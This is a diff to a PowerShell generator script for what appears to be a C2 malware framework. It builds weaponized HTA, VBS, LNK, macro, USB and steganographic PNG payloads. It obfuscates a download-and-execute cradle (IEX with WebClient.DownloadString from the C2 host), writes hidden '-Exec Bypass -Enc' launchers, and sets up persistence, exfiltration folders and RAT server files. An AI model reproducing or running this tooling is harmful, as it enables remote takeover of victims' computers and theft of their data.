@@ -81,7 +81,6 @@ New-Item -Path $ScriptDir -Name "Package" -ItemType "directory"
 
 $choice0 = Read-Host -Prompt 'Do you need to setup persistence for your C2 URL ? (y/n)'
 if ($choice0 -eq "y") {
-#Import-Module $ScriptDir\Package\Build\PrepareC2Key.ps1
 function PastebinStoredC2Value ($MyC2Url) {
 	$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
 	$key = Create-AesKey
@@ -172,7 +171,7 @@ $sleeptime1 = $settings.Get_Item("sleeptime1")
 $sleeptime2 = $settings.Get_Item("sleeptime2")
 $sleeptime3 = $settings.Get_Item("sleeptime3")
 $evilimage = $settings.Get_Item("evilimage")
-if (!$evilimage ) {$evilimage = "$ScriptDir\Package\Build\dog.png" }
+if (!$evilimage ) {$evilimage = "$ScriptDir\Build\dog.png" }
 $lnkicon = $settings.Get_Item("lnkicon")
 $lnkname = $settings.Get_Item("lnkname")
 $enddate = $settings.Get_Item("enddate")
@@ -188,7 +187,7 @@ $passcrypt = $settings.Get_Item("passcrypt")
 $thatsalt = $settings.Get_Item("salt")
 $obfuscationToken = $settings.Get_Item("obfuscationToken")
 $c2channel = $settings.Get_Item("c2channel")
-Import-Module "$ScriptDir\Generator\obfuscator\Invoke-Obfuscation.psd1"
+Import-Module "$ScriptDir\Build\obfuscator\Invoke-Obfuscation.psd1"
 
 $getc2
 
@@ -230,7 +229,7 @@ while ($t -eq $False) { #check internet connexion before continue (wait until in
 }
 Start-Sleep -Seconds 3
 
-
+$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
 (get-content $ScriptDir\Build\zxd.ps1) | foreach-object {$_ -replace "ROOT_FOLDER", "$rootfolder" -replace "SERVER_IP_ADDRESS", "$c2c" -replace "LINK_FOLDER", "$linkfolder" } | set-content .\zxd.ps1	
 Start-Sleep -Seconds 2
 Import-Module .\zxd.ps1
@@ -242,14 +241,16 @@ Write-Host "Encoded version :" $enc;
 Set-Content .\zxd\encoded.txt -Value $enc
 
 #Remove comments  --- Remove-Comments
-
-Import-Module $ScriptDir\Generator\obfuscator\CleanComments.ps1
+$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
+Import-Module $ScriptDir\Build\obfuscator\CleanComments.ps1
+copy $ScriptDir\Build\agent_pnt.ps1 .\agent_pnt.ps1
+copy $ScriptDir\Build\appdat.ps1 .\appdat.ps1
 CleanComments -Path .\agent_pnt.ps1| set-content .\agent_pnt.ps1
 CleanComments -Path .\appdat.ps1 | set-content .\appdat.ps1
 
+$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
 (get-content $ScriptDir\Build\agent.ps1) | foreach-object {$_ -replace "GETC2URL", "$getc2" -replace "KEYTOREADGETC2", "$keyreadgetC2" -replace "UPGRADEPOWERSHELL", "$upgradepshell" -replace "ROOT_FOLDER", "$rootfolder"  -replace "LINK_FOLDER", "$linkfolder" -replace "MYOPS", "$ops" -replace "SLPTM1", "$sleeptime1" -replace "SLPTM2", "$sleeptime2" -replace "SLPTM3", "$sleeptime3" -replace "ENDDATE", "$enddate" -replace "WORKSTART", "$workstart" -replace "WORKEND", "$workend" -replace "KEYUPLOAD", "$keyupload" -replace "KEYUPLOAD", "$keyupload2"  -replace "AUTOPERSIST", "$autopersist"  -replace "DEFAULTPERSIST", "$defaultpersist" -replace "REGKEY", "$regkey"  -replace "WMIKEY", "$wmikey"  -replace "MYENCODED", "$enc" -replace "C2CHANNEL", "$c2channel" } | set-content .\temp.ps1
 CleanComments -Path .\temp.ps1| set-content .\payload.ps1
-#get-content .\temp.ps1 | set-content .\payload.ps1
 set-content .\temp.ps1 -Value ""
 Remove-Item -path .\temp.ps1 -recurse
 $ooo = Read-Host -Prompt 'OK'
@@ -333,23 +334,24 @@ Write-Host "Encoded > \c2c\pnt-Encoded.bat"
 (get-content $ScriptDir\Build\appdat.ps1) | foreach-object {$_ -replace "LNKFILE", "$lnkname" -replace "LNKICON", "$lnkicon" -replace "ENCODED", "$enc" } | set-content .\c2c\appdat.ps1
 Write-Host "--------------> 20 %" -ForegroundColor DarkGreen;
 #set-content .\agent.ps1 -Value ""
-#set-content .\agent_pnt.ps1 -Value ""
+set-content .\agent_pnt.ps1 -Value ""
 
 #set-content .\generator.ps1 -Value ""
 set-content .\zxd.ps1 -Value ""
 #Rename-Item .\agent.ps1 brib1.txt
-#Rename-Item .\agent_pnt.ps1 brib2.txt
+Rename-Item .\agent_pnt.ps1 brib2.txt
 #Rename-Item .\generator.ps1 brib3.txt
 Rename-Item .\zxd.ps1 brib4.txt
-#Rename-Item .\appdat.ps1 brib5.txt
+Rename-Item .\appdat.ps1 brib5.txt
 #attrib -h .\payload.ps1
 #Remove-Item -path .\brib1.txt -recurse
-#Remove-Item -path .\brib2.txt -recurse
+Remove-Item -path .\brib2.txt -recurse
 #Remove-Item -path .\brib3.txt -recurse
 Remove-Item -path .\brib4.txt -recurse
-#Remove-Item -path .\brib5.txt -recurse
+Remove-Item -path .\brib5.txt -recurse
 
 Write-Host "--------------> 30 %" -ForegroundColor DarkGreen;
+$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
 function Out-HTA {
     [CmdletBinding()] Param(
         [Parameter(Position = 0, Mandatory = $False)]
@@ -661,31 +663,32 @@ Out-Wmic
 Write-Host "Weaponized WMIC file "
 
 function Out-PNG {
+$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
 Import-Module $ScriptDir\Build\stego.ps1
 echo "PowerShell -Exec Bypass -NoL -Win Hidden -Enc $enc" > .\bat\pnt.ps1
-Set-PowerStego -Method Hide -ImageSource File -ImageSourcePath .\$evilimage -ImageDestinationPath .\png\$evilimage -PayloadSource Text -PayloadPath .\bat\pnt.ps1
-Set-PowerStego -Method GeneratePayload -ImageSource URL -ImageSourcePath $c2c/$rootfolder/$linkfolder/$evilimage -PayloadSource Text -PayloadPath .\png\InfectWithPNG.txt
+Set-PowerStego -Method Hide -ImageSource File -ImageSourcePath $evilimage -ImageDestinationPath .\png\image.png -PayloadSource Text -PayloadPath .\bat\pnt.ps1
+Set-PowerStego -Method GeneratePayload -ImageSource URL -ImageSourcePath $c2c/$rootfolder/$linkfolder/image.png -PayloadSource Text -PayloadPath .\png\InfectWithPNG.txt
 }
 Out-PNG
 copy $ScriptDir\Build\stego.ps1 .\stego.ps1
-Write-Host "Weaponized PNG file : $evilimage"
+Write-Host "Weaponized PNG file : $evilimage" -ForegroundColor DarkGreen;
 add-content ./stego.ps1 -Value "VAR_IMAGE_URL = Read-Host -Prompt 'Use your OWN URL. Type URL of Evil image : '" 
 add-content ./stego.ps1 -Value "Set-PowerStego -Method GeneratePayload -ImageSource URL -ImageSourcePath VAR_IMAGE_URL -PayloadSource Text -PayloadPath .\InfectWithPNG.txt"
 
 function Out-Obfuscate {
 	Invoke-Obfuscation -ScriptBlock {IEX(New-Object Net.WebClient).DownloadString("$c2c/$rootfolder/$linkfolder/pnt.ps1")} -Command "$obfuscationToken .\bat\pnt-obfuscated.bat" -Quiet
 	Write-Host "Obfuscate > \bat\pnt-obfuscated.bat"
-	cscript.exe $ScriptDir\Generator\obfuscator\vbs_obfuscator.vbs .\vbs\agent.vbs > .\vbs\agent_obfuscated.vbs
+	cscript.exe $ScriptDir\Build\obfuscator\vbs_obfuscator.vbs .\vbs\agent.vbs > .\vbs\agent_obfuscated.vbs
 	}
 Out-Obfuscate
-Write-Host "Obfuscation OK "
+Write-Host "Obfuscation OK " -ForegroundColor DarkGreen;
 Write-Host "--------------> 90 %" -ForegroundColor DarkGreen;
 
 echo "PowerShell -Exec Bypass -NoL -Win Hidden -Enc $enc" > .\bat\pnt.bat
 copy .\bat\pnt.bat .\c2c
 copy .\c2c\pnt-Encoded.bat .\bat
-copy .\png\$evilimage .\c2c
-move .\pnt.SED .\exe
+copy .\png\image.png .\c2c
+#move .\pnt.SED .\exe
 #---Debug---
 set-content .\payload.ps1 -Value ""
 Rename-Item .\payload.ps1 note.txt
@@ -702,38 +705,39 @@ copy $ScriptDir\Build\MacroPack.exe .\xls
 Write-Host "."
 Write-Host "."
 
-Import-Module $ScriptDir\Generator\obfuscator\Invoke-CradleCrafter.psd1
+$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
+Import-Module $ScriptDir\Build\obfuscator\Invoke-CradleCrafter.psd1
 $cradle = Invoke-CradleCrafter -Url "$c2c/$rootfolder/$linkfolder/pnt.ps1" -Command 'Memory\*\All\1' -Quiet  
 set-content .\c2c\pnt-secured-iex.ps1 -Value $cradle
-Write-Host "CradleCrafter > \c2c\pnt-secured-iex.ps1"
+Write-Host "CradleCrafter > \c2c\pnt-secured-iex.ps1" -ForegroundColor DarkGreen;
 
-copy $ScriptDir\Package\Build\*.ico .\ico
-move .\ico $ScriptDir\Package\Client
-move .\bat $ScriptDir\Package\Client
-copy $ScriptDir\Package\Build\$evilimage .\OLD.png
-move .\OLD.png .\png
+$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
+copy "$ScriptDir\Build\*.ico" .\ico
+move .\ico "$ScriptDir\Package\Client"
+move .\bat "$ScriptDir\Package\Client"
+copy $evilimage .\png\OLD.png
 move .\stego.ps1 .\png
-move .\png $ScriptDir\Package\Client
-move .\hta $ScriptDir\Package\Client
-move .\vbs $ScriptDir\Package\Client
-copy $ScriptDir\Build\Wordpad.lnk .\lnk
-copy $ScriptDir\Build\Explorer.lnk .\lnk
-copy $ScriptDir\Build\Windows.lnk .\lnk
-copy $ScriptDir\Build\Folder.lnk .\lnk
-copy .\$lnkname .\usb
-move .\lnk $ScriptDir\Package\Client
-move .\xls $ScriptDir\Package\Client
-move .\js $ScriptDir\Package\Client
-move .\exe $ScriptDir\Package\Client
-move .\sct $ScriptDir\Package\Client
-move .\usb $ScriptDir\Package\Client
-move .\c2c $ScriptDir\Package\Client
-move .\zxd $ScriptDir\Package\Client
-copy $ScriptDir\Build\HttpRatServer.ps1 $ScriptDir\Package\Client
-copy $ScriptDir\Build\JSRatServer.ps1 $ScriptDir\Package\Client
+move .\png "$ScriptDir\Package\Client"
+move .\hta "$ScriptDir\Package\Client"
+move .\vbs "$ScriptDir\Package\Client"
+move .\Wordpad.lnk .\lnk
+move .\Explorer.lnk .\lnk
+move .\Windows.lnk .\lnk
+move .\Folder.lnk .\lnk
+move .\$lnkname .\usb
+move .\lnk "$ScriptDir\Package\Client"
+move .\xls "$ScriptDir\Package\Client"
+move .\js "$ScriptDir\Package\Client"
+move .\exe "$ScriptDir\Package\Client"
+move .\sct "$ScriptDir\Package\Client"
+move .\usb "$ScriptDir\Package\Client"
+move .\c2c "$ScriptDir\Package\Client"
+move .\zxd "$ScriptDir\Package\Client"
+copy "$ScriptDir\Build\HttpRatServer.ps1" "$ScriptDir\Package\Client"
+copy "$ScriptDir\Build\JSRatServer.ps1" "$ScriptDir\Package\Client"
 
-Write-Host "Clean tasks"
-Write-Host "---- FINISH ------> 100 %" -ForegroundColor Red;
+#Write-Host "Clean tasks"
+Write-Host "---- FINISH ------> 100 %" -ForegroundColor Yellow;
 
 Write-Host "CONTENT GENERATED IN FOLDER c2c MUST BE COPY&PASTE IN THE LINKFOLDER OF YOUR ACTUAL C2SERVER"
 
@@ -741,6 +745,10 @@ $ooo = Read-Host -Prompt 'OK'
 }
 
 #################  SERVER C2 ENCRYPTION #############################################
+$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
+Get-Content "$ScriptDir\config.ini" | ForEach-Object -Begin {$settings=@{}} -Process {$store = [regex]::split($_,'='); if(($store[0].CompareTo("") -ne 0) -and ($store[0].StartsWith("[") -ne $True) -and ($store[0].StartsWith("#") -ne $True)) {$settings.Add($store[0], $store[1])}}
+$linkfolder = $settings.Get_Item("linkfolder")
+
 $choice2 = Read-Host -Prompt 'Do you want to generate C2 Server files ? (y/n)'
 if ($choice2 -eq "y") {
 
@@ -749,17 +757,29 @@ New-Item -Path $ScriptDir\Package -Name "C2Server" -ItemType "directory"
 md $ScriptDir\Package\C2Server\$linkfolder
 md $ScriptDir\Package\C2Server\exfil
 md $ScriptDir\Package\C2Server\ui
-Import-Module $ScriptDir\xencrypt.ps1
+Import-Module $ScriptDir\Build\xencrypt.ps1
+$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
+copy $ScriptDir\www\exfil $ScriptDir\Package\C2Server\exfil
+copy $ScriptDir\www\ui $ScriptDir\Package\C2Server\ui
+copy $ScriptDir\www\link\*.html $ScriptDir\Package\C2Server\$linkfolder
+copy $ScriptDir\www\link\*.php $ScriptDir\Package\C2Server\$linkfolder
+copy $ScriptDir\www\link\*.png $ScriptDir\Package\C2Server\$linkfolder
+copy $ScriptDir\www\link\*.xml $ScriptDir\Package\C2Server\$linkfolder
+copy $ScriptDir\www\link\*.psm1 $ScriptDir\Package\C2Server\$linkfolder
+copy $ScriptDir\www\link\*.psm1 $ScriptDir\Package\C2Server\$linkfolder
 
 $extensionArray = "ps1","txt"
 foreach ($extension in $extensionArray) {
-	Get-ChildItem -Path $ScriptDir\www\$linkfolder -Recurse -ErrorAction SilentlyContinue -Filter *.$extension |  Where-Object { $_.Extension -eq ".$extension" }|foreach {$path = Resolve-Path $_.FullName ; Invoke-Xencrypt -InFile $path -OutFile "$ScriptDir\Package\C2Server\$linkfolder\$_" -Iterations 3; $path}  
+	Get-ChildItem -Path $ScriptDir\www\link -Recurse -ErrorAction SilentlyContinue -Filter *.$extension |  Where-Object { $_.Extension -eq ".$extension" }|foreach {$path = Resolve-Path $_.FullName ; Invoke-Xencrypt -InFile $path -OutFile "$ScriptDir\Package\C2Server\$linkfolder\$_" -Iterations 3; $path}  
 	}
-
-}
+	
+if ($choice1 -eq "y") {}
 
 Write-Host "READY ?"
 $ooo = Read-Host -Prompt 'OK'
+}
+
+
 <##>
 
 
